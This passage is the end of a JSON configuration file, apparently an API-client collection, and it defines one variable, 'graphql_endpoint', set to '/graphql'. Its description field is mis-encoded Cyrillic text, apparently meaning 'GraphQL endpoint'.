			"key": "graphql_endpoint",
			"value": "/graphql",
			"type": "string",
			"description": "–≠–Ω–¥–ø–æ–∏–Ω—Ç GraphQL"
		}
	]
} 